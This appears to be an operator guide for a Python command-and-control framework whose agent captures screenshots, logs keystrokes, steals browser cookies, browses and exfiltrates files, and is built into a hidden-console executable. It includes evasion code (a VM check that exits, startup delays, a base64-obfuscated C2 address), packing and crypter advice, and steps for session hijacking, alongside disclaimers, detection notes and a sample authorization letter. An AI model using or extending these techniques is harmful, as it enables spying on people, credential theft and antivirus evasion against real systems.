# 🔥 C2 Framework - Advanced Features Guide

## ⚠️ CRITICAL WARNING

**THESE FEATURES ARE EXTREMELY INVASIVE AND POWERFUL**

**Legal Use ONLY:**
- ✅ Authorized Red Team engagements with signed contracts
- ✅ Your own systems in controlled lab environments
- ✅ Educational purposes in isolated networks
- ✅ Security research with explicit permissions

**ILLEGAL Use (DO NOT):**
- ❌ Unauthorized access to any system
- ❌ Distributing as malware
- ❌ Any use without explicit written permission
- ❌ Commercial use without proper authorization

**Violation can result in:**
- Criminal prosecution
- Heavy fines
- Imprisonment
- Permanent criminal record

---

## 📋 Advanced Features Overview

### 1. 📸 Screenshot Capture
**Capability**: Capture real-time screenshots of remote desktop
**Use Case**: Visual verification of target system state
**Detection Risk**: MEDIUM - May trigger security software

### 2. 📁 File Browser
**Capability**: Browse, download, and upload files remotely
**Use Case**: Data exfiltration, payload delivery
**Detection Risk**: LOW-MEDIUM - Depends on files accessed

### 3. ⌨️ Keylogger
**Capability**: Capture all keyboard input in real-time
**Use Case**: Credential harvesting, user behavior analysis
**Detection Risk**: HIGH - Often detected by AV/EDR

### 4. 🍪 Cookie Stealer
**Capability**: Extract cookies from browsers (Chrome, Firefox, Edge)
**Use Case**: Session hijacking, credential theft
**Detection Risk**: HIGH - Triggers AV when accessing browser files

### 5. 🔨 Payload Builder
**Capability**: Generate custom .exe payloads from the dashboard
**Use Case**: Deploying agents with custom C2 configuration
**Detection Risk**: VERY HIGH - Executables are heavily scrutinized

---

## 🚀 Usage Guide

### Starting the Advanced Agent

**Option 1: Standard Python**
```bash
python3 /app/agent_advanced.py
```

**Option 2: Background (Linux/Mac)**
```bash
nohup python3 /app/agent_advanced.py > /dev/null 2>&1 &
```

**Option 3: Background (Windows)**
```cmd
pythonw agent_advanced.py
```

**Option 4: Compiled Binary**
```bash
# Build first (see Builder section)
./build/payload_[timestamp].exe
```

---

## 📸 Screenshot Capture

### How It Works
1. Agent captures full desktop using PIL/ImageGrab
2. Image compressed to PNG (quality 50%)
3. Converted to base64
4. Sent encrypted via WebSocket
5. Stored in C2 logs

### Usage

**From Dashboard:**
1. Navigate to **"Advanced"** tab
2. Select target node
3. Click **"Take Screenshot"**
4. Check logs for result

**Result Location:**
- Screenshots are logged in audit logs
- Data is base64 encoded
- Can be decoded to view image

### Limitations
- Requires PIL library on target
- May fail on headless systems
- File size can be large (1-5 MB)

### Detection Indicators
- PIL/Pillow library loaded
- Screen capture API calls
- Network transfer of image data

---

## 📁 File Browser

### Features
- List directories and files
- Navigate file system
- Download files (as base64)
- Upload files to target
- View file metadata (size, type)

### Usage

**Browse Files:**
```javascript
// From Dashboard > Advanced tab
Click "Browse Files" button
```

**List Specific Directory:**
- Backend will receive path
- Returns directory contents
- Shows files, folders, sizes

**Download File:**
1. Request file read with path
2. Receives base64 content
3. Decode and save locally

**Upload File:**
1. Encode file as base64
2. Send with target path
3. Agent writes to disk

### Security Considerations
- May trigger file access monitors
- Large files = network suspicious
- Antivirus may scan uploaded files

---

## ⌨️ Keylogger

### Capabilities
- Captures all keyboard input
- Runs in background thread
- Buffer stores up to 1000 keystrokes
- No disk writes (memory only)

### Usage

**Start Keylogger:**
```
Dashboard > Advanced > Keylogger > Start Keylogger
```

**Stop Keylogger:**
```
Dashboard > Advanced > Keylogger > Stop Keylogger
```

**Retrieve Logs:**
```
Dashboard > Advanced > Keylogger > Get Keylog Data
```

### How It Works
1. Uses `pynput` library
2. Hooks keyboard events
3. Stores keystrokes in memory buffer
4. Sends to C2 on request
5. Clears buffer after retrieval

### Limitations
- Requires `pynput` library
- May not work on some Linux distros
- Detected by most AV/EDR
- Special keys shown as "Key.enter", etc.

### Detection Indicators
- pynput library loaded
- Keyboard hook registered
- High CPU if poorly implemented
- Memory anomalies

### Evasion (Educational)
- Compile to binary (obfuscates pynput)
- Use lower-level API (Windows: SetWindowsHookEx)
- Add delays between captures
- Encrypt buffer in memory

---

## 🍪 Cookie Stealer

### Target Browsers
- **Chrome** (Windows, Linux, Mac)
- **Edge** (Windows)
- **Firefox** (planned)

### How It Works
1. Locates browser cookie database
2. Copies to temp location (avoids locks)
3. Reads SQLite database
4. Extracts cookies (domain, name, value)
5. Sends encrypted to C2

### Usage

**From Dashboard:**
```
Dashboard > Advanced > Cookie Stealer > Steal Cookies
```

**Result:**
```json
{
  "chrome": [
    {"domain": "example.com", "name": "session", "value": "abc123..."},
    ...
  ],
  "edge": [...],
  "firefox": [...]
}
```

### Important Notes

**Chrome Encryption:**
- Windows: Uses DPAPI (user-encrypted)
- Linux: Plain text or keyring
- Mac: Uses Keychain (requires auth)

**Detection Risk:**
- File access to browser databases
- SQLite operations
- AV signatures for cookie theft

### Limitations
- May fail if browser is open (DB locked)
- Encrypted cookies need decryption
- Requires sqlite3 library

---

## 🔨 Payload Builder

### Features
- Generate custom .exe from dashboard
- Configure C2 server URL
- Set AES encryption key
- Hide console window option
- Includes all advanced features

### Usage

**Step 1: Configure**
```
Dashboard > Builder tab
```

**Step 2: Set Parameters**
- **C2 Server**: `ws://your-server-ip:8001/api/ws`
- **AES Key**: Your base64 AES key (must match backend)
- **Hide Console**: ✓ (for stealth)

**Step 3: Generate**
```
Click "Generate Payload (.exe)"
```

**Step 4: Download**
```
Payload saved to: /app/payloads/payload_[timestamp].exe
```

### How It Works
1. Reads `agent_advanced.py` template
2. Replaces C2_SERVER and AES_KEY values
3. Writes customized agent to temp file
4. Runs PyInstaller to create .exe
5. Saves to `/app/payloads/` directory

### PyInstaller Options
```bash
--onefile        # Single executable
--noconsole      # No command window
--name           # Custom name
--icon           # Custom icon (optional)
```

### Advanced Obfuscation

**Basic:**
```bash
pyinstaller --onefile --noconsole agent_advanced.py
```

**With Packing:**
```bash
# Use UPX compression
pyinstaller --onefile --noconsole --upx-dir=/path/to/upx agent_advanced.py
```

**With Crypter (External):**
- Use commercial crypters (legal use only)
- Themida, VMProtect (commercial)
- Open source: hyperion, shellter

---

## 🛡️ Evasion Techniques (Educational)

### 1. Anti-VM Detection
```python
def is_vm():
    # Check for VM artifacts
    if "VMware" in platform.processor():
        return True
    if os.path.exists("/sys/class/dmi/id/product_name"):
        with open("/sys/class/dmi/id/product_name") as f:
            if "VirtualBox" in f.read():
                return True
    return False

if is_vm():
    sys.exit(0)  # Don't run in VM
```

### 2. Sleep Before Connect
```python
# Delay execution
time.sleep(random.randint(60, 300))  # 1-5 minutes
```

### 3. Domain Fronting
```python
# Use legitimate domains as fronts
# Requires CDN setup (CloudFlare, Azure CDN)
```

### 4. Process Hollowing (Advanced)
- Replace legitimate process memory
- Windows only, requires admin
- Highly complex

### 5. String Obfuscation
```python
# Instead of: C2_SERVER = "ws://10.0.0.1:8001"
# Use base64:
import base64
C2_SERVER = base64.b64decode("d3M6Ly8xMC4wLjAuMTo4MDAx").decode()
```

---

## 🔍 Detection & Forensics

### What Defenders See

**Network Level:**
- WebSocket connections to external IP
- Encrypted traffic patterns
- Regular heartbeat intervals

**Host Level:**
- Suspicious process (python.exe, unknown .exe)
- Network connections
- File access to browser databases
- Keyboard hooks (keylogger)
- Screen capture API calls

**Memory:**
- AES keys in memory
- C2 server strings
- Decrypted communications buffer

### Forensic Artifacts

**Windows:**
```
- Prefetch files (recent execution)
- AmCache.hve (program execution)
- Registry keys (if persistence added)
- Network logs (netstat history)
- Event logs (suspicious PowerShell, process creation)
```

**Linux:**
```
- .bash_history
- /var/log/auth.log
- /var/log/syslog
- Process listings in /proc/
```

---

## 🧪 Testing Scenarios

### Lab Setup

**VM 1: C2 Server**
- Ubuntu/Windows with this framework
- Static IP: 192.168.1.100

**VM 2: Windows Target**
- Windows 10/11
- Isolated network

**VM 3: Linux Target**
- Ubuntu/Kali
- Isolated network

**VM 4: Monitoring**
- Wireshark
- Sysinternals Suite
- Process Monitor

### Test 1: Screenshot Capture
```
1. Deploy agent to target
2. Verify connection in dashboard
3. Request screenshot
4. Verify image received
5. Check AV response
```

### Test 2: Keylogger
```
1. Start keylogger on target
2. Type test phrases on target
3. Retrieve keylog
4. Verify captured data
5. Monitor for AV detection
```

### Test 3: Cookie Theft
```
1. Login to test site on target browser
2. Execute cookie stealer
3. Verify cookies extracted
4. Attempt session hijacking
5. Document detection events
```

### Test 4: File Exfiltration
```
1. Create test file on target
2. Browse to file location
3. Download file via C2
4. Verify file integrity
5. Check network logs
```

---

## 📊 Comparison with Commercial Tools

| Feature | This Framework | Cobalt Strike | Metasploit | Empire |
|---------|---------------|---------------|------------|---------|
| Remote Shell | ✅ | ✅ | ✅ | ✅ |
| Screenshot | ✅ | ✅ | ✅ | ✅ |
| Keylogger | ✅ | ✅ | ✅ | ✅ |
| File Browser | ✅ | ✅ | ✅ | ✅ |
| Cookie Theft | ✅ | ⚠️ Module | ⚠️ Script | ⚠️ Module |
| Builder | ✅ | ✅ | ✅ | ✅ |
| Price | Free | $3,500/yr | Free | Free |
| Support | Community | Commercial | Community | Community |
| Evasion | Basic | Advanced | Medium | Medium |
| Malleable C2 | ❌ | ✅ | ❌ | ❌ |

---

## 🔐 Defensive Recommendations

### For Defenders

**Detection:**
```
1. Monitor WebSocket connections
2. Detect pynput/PIL library loads
3. Alert on browser database access
4. Watch for keyboard hooks
5. Scan executables from unknown sources
```

**Prevention:**
```
1. Application whitelisting
2. EDR deployment
3. Network segmentation
4. Disable PowerShell for standard users
5. Browser hardening
```

**Response:**
```
1. Isolate affected system
2. Kill suspicious processes
3. Capture memory dump
4. Analyze network traffic
5. Check for persistence
```

---

## 📝 Audit Logging

All advanced features are logged:

```json
{
  "action": "screenshot_requested",
  "user": "admin",
  "node_id": "abc-123",
  "timestamp": "2025-01-01T12:00:00Z",
  "details": "Screenshot capture initiated"
}
```

```json
{
  "action": "keylogger_start",
  "user": "admin",
  "node_id": "abc-123",
  "timestamp": "2025-01-01T12:05:00Z",
  "details": "Keylogger activated"
}
```

```json
{
  "action": "steal_cookies",
  "user": "admin",
  "node_id": "abc-123",
  "timestamp": "2025-01-01T12:10:00Z",
  "details": "Browser cookies extraction requested"
}
```

---

## 🎓 Learning Resources

### Books
- "Red Team Field Manual" by Ben Clark
- "The Hacker Playbook 3" by Peter Kim
- "Operator Handbook" by Netmux

### Online
- [MITRE ATT&CK](https://attack.mitre.org/)
- [Red Team Notes](https://www.ired.team/)
- [Pentester Academy](https://www.pentesteracademy.com/)

### Certifications
- OSCP (Offensive Security Certified Professional)
- CRTO (Certified Red Team Operator)
- PNPT (Practical Network Penetration Tester)

---

## ⚖️ Legal Framework

### Required Documentation

**Before Using:**
1. **Rules of Engagement (ROE)** - Signed by client
2. **Scope Document** - Approved systems only
3. **Authorization Letter** - Legal permission
4. **Non-Disclosure Agreement** - Protect findings
5. **Insurance** - Liability coverage

### Sample Authorization

```
PENETRATION TESTING AUTHORIZATION

I, [Client Name], authorize [Your Company] to perform 
penetration testing including the use of Command & Control 
frameworks on the following systems:

Systems in Scope:
- 192.168.1.100-200
- testdomain.com

Authorized Techniques:
- Remote code execution
- Keylogging (authorized users only)
- Screenshot capture
- Cookie extraction
- File access

Period: [Start Date] to [End Date]

Signature: _________________
Date: _____________________
```

---

## 🚨 Incident Response

### If Detected During Engagement

**Do:**
1. ✅ Immediately contact client POC
2. ✅ Document what was detected
3. ✅ Provide IOCs to blue team
4. ✅ Help with cleanup if requested

**Don't:**
1. ❌ Continue if asked to stop
2. ❌ Delete evidence
3. ❌ Blame the tools
4. ❌ Fail to report findings

---

## 🔧 Troubleshooting

### Screenshot Not Working
```
Error: "Screenshot capability not available"
Solution: Install PIL on target
  pip install pillow
```

### Keylogger Fails
```
Error: "Keylogger not available"
Solution: Install pynput
  pip install pynput
```

### Cookie Stealer Returns Empty
```
Possible Causes:
1. Browser not installed
2. No cookies present
3. Browser database locked (browser open)
4. Insufficient permissions

Solution: Close browser first or wait
```

### Payload Build Fails
```
Error: "PyInstaller not found"
Solution: Install PyInstaller
  pip install pyinstaller
```

---

## 📦 Dependencies

### Agent Requirements
```
websockets
pycryptodome
psutil
requests
pillow         # For screenshots
pynput         # For keylogger
pyinstaller    # For building
```

### Install All
```bash
pip install websockets pycryptodome psutil requests pillow pynput pyinstaller
```

---

## 🎯 Next Steps

1. **Read** this guide completely
2. **Test** in isolated lab environment
3. **Understand** detection mechanisms
4. **Practice** evasion techniques
5. **Document** findings thoroughly
6. **Get** proper authorization before real use

---

## ⚠️ Final Warning

**THIS IS NOT A JOKE**

Using these tools without authorization is:
- A federal crime (CFAA in US)
- Prosecutable worldwide
- Career-ending
- Life-altering

**ONLY USE IN AUTHORIZED ENVIRONMENTS**

If you're unsure whether you have permission:
**YOU DON'T**

---

🛡️ **Stay Legal. Stay Ethical. Stay Professional.**

**Developed for Educational Red Team Training - Use Responsibly**
